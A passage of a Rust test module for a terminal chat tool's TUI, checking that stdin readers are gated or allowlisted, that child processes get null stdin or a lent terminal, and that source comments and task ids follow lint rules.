            ("src/main.rs", "shell_execute", CLI_ONLY),
            ("src/main.rs", "resolve_oauth_client", PROMPT_GATED),
            ("src/mcp/manage.rs", "handle_remove", CLI_ONLY),
            ("src/mcp/manage.rs", "handle_add", CLI_ONLY),
            ("src/mcp/manage.rs", "provision_secrets", CLI_ONLY),
            ("src/prompt/mod.rs", "select", REPL_PROMPTER),
            ("src/prompt/mod.rs", "confirm", REPL_PROMPTER),
            ("src/prompt/mod.rs", "prompt", REPL_PROMPTER),
            ("src/rag/mod.rs", "attach", PROMPT_GATED),
            ("src/rag/mod.rs", "select_embedding_model", PROMPT_GATED),
            ("src/rag/mod.rs", "select_rag_driver", PROMPT_GATED),
            ("src/rag/mod.rs", "select_extractor_model", PROMPT_GATED),
            ("src/rag/mod.rs", "set_chunk_size", PROMPT_GATED),
            ("src/rag/mod.rs", "set_graph_hops", PROMPT_GATED),
            ("src/rag/mod.rs", "set_chunk_overlay", PROMPT_GATED),
            ("src/rag/mod.rs", "add_documents", PROMPT_GATED),
            (
                "src/rag/mod.rs",
                "resolve_or_create_api_key_secret",
                PROMPT_GATED,
            ),
            ("src/repl/mod.rs", "handle_shell_passthrough", VIA_RUN_GATE),
            (
                "src/utils/abort_signal.rs",
                "drain_terminal_events",
                REPL_PAINTER,
            ),
            (
                "src/utils/command.rs",
                "a_signal_killed_loader_is_not_a_success",
                NULL_STDIN,
            ),
            (
                "src/utils/command.rs",
                "run_loader_command",
                LOADER_STDIN_CLOSED,
            ),
            ("src/vault/mod.rs", "add_secret", PROMPT_GATED),
            ("src/vault/mod.rs", "update_secret", PROMPT_GATED),
            (
                "src/vault/utils.rs",
                "create_vault_password_file",
                PROMPT_GATED,
            ),
            ("src/vault/utils.rs", "prompt_provider_choice", PROMPT_GATED),
            ("src/vault/utils.rs", "prompt_aws_provider", PROMPT_GATED),
            ("src/vault/utils.rs", "prompt_gcp_provider", PROMPT_GATED),
            ("src/vault/utils.rs", "prompt_azure_provider", PROMPT_GATED),
            ("src/vault/utils.rs", "prompt_gopass_provider", PROMPT_GATED),
            (
                "src/vault/utils.rs",
                "prompt_one_password_provider",
                PROMPT_GATED,
            ),
        ];
        let readers = keyboard_readers();
        assert!(!readers.is_empty());
        let unaccounted: Vec<String> = readers
            .iter()
            .filter(|r| !r.gated)
            .filter(|r| {
                !allowlist
                    .iter()
                    .any(|(file, function, _)| *file == r.file && *function == r.function)
            })
            .map(|r| format!("{}:{}", r.file, r.function))
            .collect();
        assert!(
            unaccounted.is_empty(),
            "keyboard readers neither gated on crate::tui::active() nor allowlisted:\n{}",
            unaccounted.join("\n")
        );
        let stale: Vec<String> = allowlist
            .iter()
            .filter(|(file, function, _)| {
                !readers
                    .iter()
                    .any(|r| r.file == *file && r.function == *function && !r.gated)
            })
            .map(|(file, function, _)| format!("{file}:{function}"))
            .collect();
        assert!(
            stale.is_empty(),
            "allowlist entries with no matching ungated reader:\n{}",
            stale.join("\n")
        );
        let mislabelled: Vec<String> = allowlist
            .iter()
            .filter_map(|(file, function, reason)| {
                let reader = readers
                    .iter()
                    .find(|r| r.file == *file && r.function == *function)?;
                (reader.prompt_gated != (*reason == PROMPT_GATED)).then(|| {
                    if reader.prompt_gated {
                        format!("{file}:{function} calls ensure_prompts_available but is listed as: {reason}")
                    } else {
                        format!("{file}:{function} is listed as prompt-gated but does not call ensure_prompts_available ahead of its first prompt")
                    }
                })
            })
            .collect();
        assert!(
            mislabelled.is_empty(),
            "allowlist reasons that disagree with the fn body:\n{}",
            mislabelled.join("\n")
        );
        assert!(
            readers.iter().any(|r| r.file == "src/utils/input.rs"
                && r.function == "read_single_key"
                && r.gated)
        );
        assert!(
            readers
                .iter()
                .any(|r| r.file == "src/utils/command.rs" && r.function == "edit_file" && r.gated)
        );
        // The loader never reads the terminal: both of its branches hand
        // the child /dev/null, so the source says `Stdio::null()` for every
        // spawn it makes and never `Stdio::inherit()`.
        let loader = fn_body(
            include_str!("../utils/command.rs"),
            "pub async fn run_loader_command",
        );
        assert!(!loader.contains("Stdio::inherit()"), "{loader}");
        assert_eq!(loader.matches("Stdio::null()").count(), 2, "{loader}");
    }

    /// The stdin readers outside this module stand down while the UI owns
    /// the terminal: no spinner polls the keyboard, no stale-input drain
    /// toggles raw mode under the event stream, and no cursor query waits
    /// for a reply the event stream would take.
    #[test]
    fn every_other_stdin_reader_checks_the_tui_flag() {
        let spinner = include_str!("../utils/spinner.rs");
        assert!(
            fn_body(spinner, "pub async fn abortable_run_with_spinner_rx")
                .contains("crate::tui::active()")
        );
        let utils = include_str!("../utils/mod.rs");
        assert!(fn_body(utils, "pub fn drain_stale_tty_input").contains("crate::tui::active()"));
        let cursor_sync = include_str!("../utils/cursor_sync.rs");
        assert!(fn_body(cursor_sync, "fn resync_stdout").contains("crate::tui::active()"));
    }

    /// A keyboard prompt asked while the UI owns the terminal is refused
    /// outright: it comes back at once, on a thread that would otherwise
    /// be stuck on a read of stdin that the event stream owns.
    #[test]
    #[serial]
    fn read_single_key_refuses_under_the_tui_without_touching_stdin() {
        let _tui_on = crate::testing::AtomicFlagGuard::set(&TUI_ACTIVE, true);
        let (tx, rx) = mpsc::channel();
        std::thread::spawn(move || {
            let _ = tx.send(crate::utils::read_single_key(
                &['y', 'n'],
                'n',
                "\x1b[33mWARNING:\x1b[0m risky\nContinue? [y/N] ",
            ));
        });
        let answer = rx
            .recv_timeout(Duration::from_secs(2))
            .expect("the gate must answer without reading stdin");
        let err = answer.unwrap_err().to_string();
        assert_eq!(
            err,
            "Keyboard prompts are not available in the TUI yet; unanswered: Continue? [y/N]"
        );
    }

    /// Registers a lender on its own thread that runs every job it is
    /// sent, the way the loop does with the screen released, and counts
    /// them; unregistered when the guard drops.
    #[cfg(unix)]
    fn test_lender() -> (LenderGuard, Arc<std::sync::atomic::AtomicUsize>) {
        let (tx, mut rx) = unbounded_channel();
        let lent = Arc::new(std::sync::atomic::AtomicUsize::new(0));
        let counter = Arc::clone(&lent);
        let lender = std::thread::spawn(move || {
            while let Some(msg) = rx.blocking_recv() {
                if let UiMsg::LendTerminal(LendJob(job)) = msg {
                    counter.fetch_add(1, Ordering::SeqCst);
                    job(&TtyHandles { _private: () });
                }
            }
        });
        set_lender(Some((tx, lender.thread().id())));
        (LenderGuard, lent)
    }

    #[cfg(unix)]
    struct LenderGuard;

    #[cfg(unix)]
    impl Drop for LenderGuard {
        fn drop(&mut self) {
            set_lender(None);
        }
    }

    /// The loop's copy of the terminal is close-on-exec: a tool child
    /// spawned during a turn must not inherit a second handle on the tty
    /// next to the capture pipe it was given.
    #[cfg(unix)]
    #[test]
    fn the_lent_tty_fd_is_cloexec() {
        use std::os::fd::AsRawFd;
        let fd = match dup_tty_out() {
            Ok(fd) => fd,
            // fd 1 is closed in this process; there is nothing to pin.
            Err(err) if err.raw_os_error() == Some(libc::EBADF) => return,
            Err(err) => panic!("dup of fd 1 failed: {err}"),
        };
        // SAFETY: fcntl with F_GETFD takes no pointers.
        let flags = unsafe { libc::fcntl(fd.as_raw_fd(), libc::F_GETFD) };
        assert_ne!(flags, -1, "{}", std::io::Error::last_os_error());
        assert_eq!(flags & libc::FD_CLOEXEC, libc::FD_CLOEXEC);
    }

    /// With the UI flag up but no loop lending the terminal (the flag
    /// outlives the loop during teardown), `.edit` on a file fails
    /// outright: no editor is spawned onto the capture pipe (the name
    /// given is not a program at all).
    #[test]
    #[serial]
    fn edit_file_without_a_lender_fails_without_spawning_an_editor() {
        let _tui_on = crate::testing::AtomicFlagGuard::set(&TUI_ACTIVE, true);
        let err = crate::utils::edit_file(
            "definitely-not-an-editor-x7x",
            std::path::Path::new("/dev/null"),
        )
        .unwrap_err();
        assert_eq!(err.to_string(), NOT_LENDING);
    }

    /// `!cmd` fails the same way without a lender.
    #[test]
    #[serial]
    fn run_command_without_a_lender_fails_without_spawning_a_child() {
        let _tui_on = crate::testing::AtomicFlagGuard::set(&TUI_ACTIVE, true);
        let err = crate::utils::run_command("definitely-not-a-shell-x7x", &["-c", "true"], None)
            .unwrap_err();
        assert_eq!(err.to_string(), NOT_LENDING);
    }

    /// With a lender registered, `!cmd` and `.edit` run their child
    /// through it: the child runs (its exit code comes back, the file it
    /// was given is touched) and the lender saw the job.
    #[cfg(unix)]
    #[test]
    #[serial]
    fn run_command_and_edit_file_run_through_the_lender_under_the_tui() {
        let _tui_on = crate::testing::AtomicFlagGuard::set(&TUI_ACTIVE, true);
        let (_lender, lent) = test_lender();
        let code = crate::utils::run_command("sh", &["-c", "exit 7"], None).unwrap();
        assert_eq!(code, 7);
        assert_eq!(lent.load(Ordering::SeqCst), 1);

        let path = crate::utils::temp_file("-lent-editor-", ".txt");
        crate::utils::edit_file("touch", &path).unwrap();
        let touched = path.is_file();
        let _ = std::fs::remove_file(&path);
        assert!(touched, "{}", path.display());
        assert_eq!(lent.load(Ordering::SeqCst), 2);
    }

    /// A document loader that writes to its output file still runs under
    /// the TUI, with stdin at EOF instead of the raw tty: the `-` here
    /// reads stdin and adds nothing.
    #[cfg(unix)]
    #[tokio::test]
    #[serial]
    async fn a_file_writing_loader_still_runs_under_the_tui() {
        let _tui_on = crate::testing::AtomicFlagGuard::set(&TUI_ACTIVE, true);
        let source = crate::utils::temp_file("-loader-source-", ".txt");
        std::fs::write(&source, "loaded under the tui x7x\n").unwrap();
        let loaded = crate::utils::run_loader_command(
            source.to_str().unwrap(),
            "txt",
            "sh -c \"cat $1 - > $2\"",
        )
        .await;
        let _ = std::fs::remove_file(&source);
        assert_eq!(loaded.unwrap(), "loaded under the tui x7x\n");
    }

    /// A task id in the source names the owner of a debt marker and
    /// nothing else: every line carrying one is a lint suppression, a
    /// `todo!`, an ignored test, or the one pre-existing marker below.
    /// An id quoted as data (inside a string literal or a backtick code
    /// span, the way the planning-debris lint and its fixtures spell
    /// theirs) is a needle, not a reference. The needles here are spelled
    /// in halves so this test's source does not match itself.
    #[test]
    fn task_ids_mark_only_owned_debt() {
        fn quoted(line: &str, at: usize) -> bool {
            let before = &line[..at];
            let quotes = before
                .match_indices('"')
                .filter(|(i, _)| !before[..*i].ends_with('\\'))
                .count();
            quotes % 2 == 1 || before.matches('`').count() % 2 == 1
        }
        let id_prefix = concat!("TA", "SK-");
        // Split so a grep for suppression attributes does not match this list.
        let debt_markers = [
            concat!("#[", "allow("),
            concat!("#![", "allow("),
            concat!("#[", "expect("),
            concat!("#![", "expect("),
            "cfg_attr(",
            "todo!",
            "unimplemented!",
            concat!("#[", "ignore"),
        ];
        // Each entry is a refusal or a parked test whose line carries the
        // id of the work that removes it.
        let allowlisted: &[(&str, &str)] = &[
            (
                "src/function/prompt_channel.rs",
                "bail!(\"Prompt reply channel is not implemented on this platform\")",
            ),
            (
                "src/utils/command.rs",
                "bail!(\"Interactive prompts are not available in the TUI yet\")",
            ),
            (
                "src/utils/input.rs",
                "bail!(\"Keyboard prompts are not available in the TUI yet; unanswered: {question}\")",
            ),
            (
                "src/config/agent.rs",
                "eprintln!(\"The agent has documents attached; starting without RAG\");",
            ),
            (
                "src/config/install_remote.rs",
                "return Ok(ObsoleteAction::Keep);",
            ),
            (
                "src/config/install_remote.rs",
                "conflict::rerun_hint() // TASK-388",
            ),
            (
                "src/config/install_remote.rs",
                "Ok((Vec::new(), missing.to_vec()))",
            ),
            ("src/tui/redirect.rs", "String::new()"),
            ("src/tui/bottom_pane.rs", "\".uninstall\", \".update\"];"),
            (
                "tests/tui_binary.rs",
                "the transcript is not yet printed on the normal screen when the UI leaves",
            ),
        ];
        let root = std::path::Path::new(env!("CARGO_MANIFEST_DIR"));
        let mut offenders = Vec::new();
        for dir in ["src", "tests"] {
            for path in rust_files(&root.join(dir)) {
                let file = path.strip_prefix(root).unwrap().display().to_string();
                let text = std::fs::read_to_string(&path).unwrap();
                for (index, line) in text.lines().enumerate() {
                    let bare: Vec<usize> = line
                        .match_indices(id_prefix)
                        .map(|(at, _)| at)
                        .filter(|at| !quoted(line, *at))
                        .collect();
                    if bare.is_empty() {
                        continue;
                    }
                    let owned = debt_markers.iter().any(|marker| line.contains(marker));
                    let listed = allowlisted
                        .iter()
                        .any(|(f, needle)| *f == file && line.contains(needle));
                    if !owned && !listed {
                        offenders.push(format!("{file}:{}: {}", index + 1, line.trim()));
                    }
                }
            }
        }
        assert!(
            offenders.is_empty(),
            "task ids outside a debt marker:\n{}",
            offenders.join("\n")
        );
    }

    /// Comments in the UI's sources describe the code, not the process
    /// that produced it: none carries the vocabulary of a plan or a
    /// review. The needles are spelled in halves (or built from parts) so
    /// this test's source does not match itself.
    #[test]
    fn ui_comments_carry_no_planning_vocabulary() {
        let needles = [
            concat!("acceptance ", "criteri"),
            concat!("usage-", "probe"),
            concat!("usage-pattern ", "probe"),
            concat!("spec-", "first"),
            concat!("quality ", "bar"),
            concat!("scope ", "extension"),
        ]
        .map(str::to_lowercase);
        // Word-bounded needles: the word itself, a letter after `R-`, or
        // the word followed by a digit, with no letter or digit touching
        // either side.
        let bounded = [
            concat!("rul", "ing"),
            concat!("rul", "ings"),
            concat!("the ", "plan"),
            concat!("reci", "pe"),
        ];
        let numbered_words = [
            concat!("rou", "nd "),
            concat!("pha", "se "),
            concat!("st", "ep "),
        ];
        let is_boundary = |c: Option<char>| c.is_none_or(|c| !c.is_alphanumeric());
        let bounded_hit = |lower: &str, raw: &str| {
            let word = bounded.iter().any(|needle| {
                lower.match_indices(needle).any(|(at, _)| {
                    is_boundary(lower[..at].chars().next_back())
                        && is_boundary(lower[at + needle.len()..].chars().next())
                })
            });
            let ruling_id = raw.match_indices(concat!("R", "-")).any(|(at, _)| {
                let after = raw[at + 2..].chars().next();
                is_boundary(raw[..at].chars().next_back())
                    && after.is_some_and(|c| c.is_ascii_uppercase())
                    && is_boundary(raw[at + 3..].chars().next())
            });
            let numbered = numbered_words.iter().any(|needle| {
                lower.match_indices(needle).any(|(at, _)| {
                    is_boundary(lower[..at].chars().next_back())
                        && lower[at + needle.len()..]
                            .chars()
                            .next()
                            .is_some_and(|c| c.is_ascii_digit())
                })
            });
            word || ruling_id || numbered
        };
        let root = std::path::Path::new(env!("CARGO_MANIFEST_DIR"));
        let mut files = rust_files(&root.join("src/tui"));
        files.extend(rust_files(&root.join("tests/common")));
        // Every UI suite: `tui_binary.rs` and each `tui_*.rs` beside it.
        let mut suites: Vec<_> = rust_files(&root.join("tests"))
            .into_iter()
            .filter(|path| {
                path.file_name()
                    .and_then(|name| name.to_str())
                    .is_some_and(|name| name.starts_with("tui_"))
            })
            .collect();
        suites.sort();
        assert!(suites.len() >= 4, "{suites:?}");
        files.extend(suites);
        let mut offenders = Vec::new();
        for path in files {
            let file = path.strip_prefix(root).unwrap().display().to_string();
            let text = std::fs::read_to_string(&path).unwrap();
            for (index, line) in text.lines().enumerate() {
                if !line.trim_start().starts_with("//") {
                    continue;
                }
                let lower = line.to_lowercase();
                if needles.iter().any(|needle| lower.contains(needle)) || bounded_hit(&lower, line)
                {
                    offenders.push(format!("{file}:{}: {}", index + 1, line.trim()));
                }
            }
        }
        assert!(
            offenders.is_empty(),
            "planning vocabulary in comments:\n{}",
            offenders.join("\n")
        );
    }

    /// The UI's design follows the Codex CLI; both attribution files name
    /// it and point at its licence.
    #[test]
    fn the_codex_attribution_names_the_repo_and_its_licence_in_both_files() {
        let root = std::path::Path::new(env!("CARGO_MANIFEST_DIR"));
        for file in ["NOTICE", "CREDITS.md"] {
            let text = std::fs::read_to_string(root.join(file)).unwrap();
            for needle in [
                "https://github.com/openai/codex",
                "https://github.com/openai/codex/blob/main/LICENSE",
            ] {
                assert!(text.contains(needle), "{file} lacks {needle}");
            }
        }
    }

    /// The keyboard-enhancement probe inside `Screen::enter` reads the tty
    /// and blocks, so the screen is entered before the signal streams are
    /// armed (a hang-up during the probe must still kill the process) and
    /// before the event stream takes stdin.
    #[test]
    fn run_enters_the_screen_then_arms_signals_and_starts_the_event_stream() {
        let run = fn_body(include_str!("mod.rs"), "pub async fn run(");
        let arm = run.find("Termination::arm()").unwrap();
        let enter = run.find("Screen::enter()").unwrap();
        let stream = run.find("EventStream::new()").unwrap();
        assert!(enter < arm, "signals armed before the screen was entered");
        assert!(
            enter < stream,
            "the event stream took stdin before the probe"
        );
    }

    /// Two event streams alive at once both read stdin, so the one being
    /// replaced must be dropped before its successor is created.
    #[test]
    fn renew_stream_drops_the_old_stream_before_opening_the_new_one() {
        let renew = fn_body(include_str!("mod.rs"), "fn renew_stream(");
        let dropped = renew.find("drop(stream.take())").unwrap();
        let opened = renew.find("EventStream::new()").unwrap();
        assert!(
            dropped < opened,
            "the new event stream was opened while the old one still held stdin"
        );
    }
}
